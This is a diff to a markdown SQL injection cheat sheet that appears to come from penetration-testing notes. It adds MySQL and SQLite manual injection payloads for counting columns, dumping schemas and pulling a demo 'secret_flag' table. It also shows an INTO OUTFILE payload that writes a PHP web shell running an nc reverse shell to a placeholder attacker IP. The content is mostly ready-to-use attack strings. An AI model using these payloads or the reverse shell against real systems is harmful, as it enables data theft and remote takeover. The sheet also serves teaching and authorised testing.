@@ -9,7 +9,8 @@ tags:
 
 # SQLi Cheat sheet for manual injection
 
-See a more detailed [explanation about SQL injection](webexploitation/sql-injection).
+- See a more detailed [explanation about SQL injection](webexploitation/sql-injection).
+- [Payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
 
 
 ### Boolean-based testing
@@ -41,7 +42,6 @@ And false
 1*56
 
 ```
-
 
 #### String based parameter injection
 
@@ -104,6 +104,10 @@ snippet]
 
 
 ```
+#########
+MYSQL
+#########
+
 # 0. Comments 
 --comment       // Oracle
 --comment       // Microsoft
@@ -137,10 +141,13 @@ snippet]
 ' OR '1'='1' order by 1;-- -   
 
 # 3. Get which column is being displayed. For instance, when we know we have 6 columns:
-1' OR '1'='1' UNION SELECT all 1,2,3,4,5,6;# 
+1' OR '1'='1' UNION SELECT 1,2,3,4,5,6;# 
 
 # 4. Get names of all databases 
 1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#
+# 4. Get names of all databases in SQLite (name and schema of the tables stored in the database).
+a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
+
 
 # 5. Get names of all tables from the selected database
 1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 
@@ -155,7 +162,44 @@ snippet]
 
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM <databaseName.tableName>;#
 
+```
 
+
+```
+#########
+SQLite
+#########
+
+# Ensure that the targeted parameter is vulnerable
+1' a' or '1'='1' --
+
+# Determine the number of columns of the query
+1' a' or '1'='1' order by 1 -- //returns all results
+1' a' or '1'='1' order by 2 -- //returns all results
+1' a' or '1'='1' order by 3 -- //returns all results
+1' a' or '1'='1' order by 4 -- //returns all results
+1' a' or '1'='1' order by 5 -- //returns all results
+1' a' or '1'='1' order by 6 -- //returns none
+# Therefore the query contains 5 columns.
+
+# Determine which columns are being returned
+1' a' or '1'='1' UNION SELECT 1,2,3,4,5 -- 
+# The table in this demo returned values 1,3,4,5. Value 2 was not returned.
+
+# Extract version of sqlite database
+1' a' or '1'='1' UNION SELECT sqlite_version,NULL,NULL,NULL,NULL -- 
+
+# Determine the name and schema of the tables stored in the database.
+a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
+
+# Determine the SQL command used to construct the tables:
+a' or '1'='1' union select sql,2,3,4,5 from sqlite_master --
+# In this demo it returned:
+1	CREATE TABLE results (rollno text primary key, email text, name text, marks real, rank integer)	4	5
+1	CREATE TABLE secret_flag (flag text, value text)	4	5
+
+# Retrieve two columns from a table
+a' or '1'='1' union select flag,2,value,4,5 from secret_flag --
 ```
 
 Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:
@@ -164,6 +208,7 @@ Also, once we know which column is injectable, there are some php functions that
 database()
 user()
 version()
+sqlite_version()
 ```
 
 
@@ -200,6 +245,8 @@ union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'
 union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'
 
 ```
+
+
 
 
 ### Manual SQLi Blind attack
